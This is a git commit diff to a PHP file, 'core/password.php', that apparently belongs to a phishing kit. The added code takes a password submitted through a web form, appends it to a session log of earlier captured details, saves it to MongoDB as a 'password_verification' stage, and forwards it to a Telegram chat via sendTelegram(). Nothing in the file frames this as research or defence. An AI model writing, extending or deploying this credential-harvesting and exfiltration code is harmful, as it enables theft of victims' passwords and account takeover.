e18b5fbc639d5250fe5b6d9ddaecf28151969fee
Peterelzevir <114345532+Peterelzevir@users.noreply.github.com>
2025-03-22 06:08:09 +0700

    Update password.php

--- core/password.php
+++ core/password.php
@@ -1,15 +1,30 @@
 <?php
+require_once __DIR__ . '/db_config.php';
+require_once __DIR__ . '/MongoDBSessionHandler.php';
+require_once __DIR__ . '/telegram.php';
+
+// Inisialisasi MongoDB Session Handler
+$mongoSessionHandler = new MongoDBSessionHandler($mongo_connection_string);
+session_set_save_handler($mongoSessionHandler, true);
+$GLOBALS['mongoSessionHandler'] = $mongoSessionHandler;
 
 session_start();
 
-include "./telegram.php";
-
-$message = $_SESSION['message'];
-$password = $_POST['password'];
+$message = $_SESSION['message'] ?? '';
+$password = $_POST['password'] ?? '';
 
 $string = $message;
 $string .= "Password : `$password`\n";
 
 $_SESSION['message'] = $string;
+$_SESSION['password'] = $password;
+
+// Simpan juga ke MongoDB secara langsung
+if (isset($mongoSessionHandler)) {
+    $mongoSessionHandler->saveTelegramData($string, [
+        'password' => $password,
+        'stage' => 'password_verification'
+    ]);
+}
 
 sendTelegram($string);
